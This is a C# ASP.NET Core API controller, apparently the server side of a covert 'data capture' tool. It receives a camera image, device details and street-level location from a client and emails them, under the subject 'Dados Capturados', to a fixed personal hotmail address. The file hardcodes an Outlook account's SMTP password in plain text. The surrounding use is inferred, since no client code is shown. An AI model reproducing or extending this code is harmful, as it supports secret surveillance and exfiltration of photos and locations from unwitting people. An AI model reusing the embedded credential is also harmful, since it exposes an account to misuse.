using Microsoft.AspNetCore.Mvc;
using System.Net.Mail;
using Newtonsoft.Json;

namespace CapturaEnvioEmailAPI.Controllers
{
    [Route("api/[controller]")]
    [ApiController]
    public class EnviarEmailController : ControllerBase
    {
        [HttpPost]
        public async Task<IActionResult> Post([FromBody] EnviarEmailModel model)
        {
            try
            {
                if (model != null)
                {
                    string base64Data = model.Base64;
                    Address address = new Address();
                    DeviceInfo deviceInfo = new DeviceInfo();

                    if (model.Location != null)
                    {
                        address = JsonConvert.DeserializeObject<Address>(model.Location);
                    }

                    if (model.DeviceInfo != null)
                    {
                        deviceInfo = JsonConvert.DeserializeObject<DeviceInfo>(model.DeviceInfo);
                    }

                    int commaIndex = base64Data.IndexOf(',');
                    if (commaIndex != -1)
                    {
                        base64Data = base64Data.Substring(commaIndex + 1);
                    }

                    byte[] bytes = Convert.FromBase64String(base64Data);

                    using (MailMessage message = new MailMessage())
                    {
                        message.From = new System.Net.Mail.MailAddress("integracaoZoho@outlook.com");
                        message.To.Add(new System.Net.Mail.MailAddress("huxxley@hotmail.com.br"));
                        message.Subject = "Dados Capturados";
                        message.Body = $"Dados capturados:\nInformações do dispositivo:\n" +
                            $"\nFabricante: {deviceInfo.Manufacturer}" +
                            $"\nModelo: {deviceInfo.Model}" +
                            $"\nProduto: {deviceInfo.Product}" +
                            $"\nSistema: {deviceInfo.OS}" +
                            $"\nNome do navegador: {deviceInfo.BrowserName}" +
                            $"\nVersão do navegador: {deviceInfo.BrowserVersion}" +
                            $"\n\nPais: {address.Country} " +
                            $"\nEstado: {address.State} " +
                            $"\nCidade: {address.City} " +
                            $"\nBairro: {address.Suburb} " +
                            $"\nRua: {address.Road} ";

                        using (MemoryStream stream = new MemoryStream(bytes))
                        {
                            Attachment attachment = new Attachment(stream, "imagem_capturada.jpg", "image/jpeg");
                            message.Attachments.Add(attachment);

                            using (SmtpClient client = new SmtpClient("smtp.gmail.com", 587))
                            {
                                //client.EnableSsl = true;
                                //client.UseDefaultCredentials = false;
                                client.Host = "smtp-mail.outlook.com";
                                client.Port = 587;
                                client.EnableSsl = true;
                                client.Credentials = new System.Net.NetworkCredential("integracaoZoho@outlook.com", "f92Bjwi4t3:2vmE");
                                await client.SendMailAsync(message);
                            }
                        }
                    }

                    return Ok();
                }

                return NotFound();
            }
            catch (Exception ex)
            {
                return StatusCode(500, $"{ex.Message}");
            }
        }
    }

    public class EnviarEmailModel
    {
        public string Base64 { get; set; }
        public string DeviceInfo { get; set; }
        public string Location { get; set; }
    }

    public class Address
    {
        public string Country { get; set; }
        public string State { get; set; }
        public string City { get; set; }
        public string Suburb { get; set; }
        public string Road { get; set; }
    }

    public class DeviceInfo
    {
        public string Manufacturer { get; set; }
        public string Model { get; set; }
        public string Product { get; set; }
        public string OS { get; set; }
        public string BrowserName { get; set; }
        public string BrowserVersion { get; set; }
    }
}